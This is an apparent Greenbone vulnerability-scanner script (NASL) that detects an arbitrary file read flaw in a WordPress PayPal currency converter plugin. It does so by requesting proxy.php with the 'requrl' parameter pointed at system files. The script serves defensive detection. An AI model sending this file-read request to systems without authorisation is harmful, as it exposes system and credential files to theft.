# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805700");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-06-15 13:39:51 +0530 (Mon, 15 Jun 2015)");
  script_name("WordPress Paypal Currency Converter Basic For Woocommerce File Read Vulnerability");

  script_tag(name:"summary", value:"WordPress Paypal Currency Converter Basic For Woocommerce is prone to file read vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to the 'proxy.php' script
  is not properly sanitizing user input via the 'requrl' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.");

  script_tag(name:"affected", value:"WordPress Paypal Currency Converter Basic
  For Woocommerce versions 1.3 or less");

  script_tag(name:"solution", value:"Upgrade to WordPress Paypal Currency
  Converter Basic For Woocommerce version 1.4 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/37253");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132278");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/paypal-currency-converter-basic-for-woocommerce");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + "/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=/" + file;
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
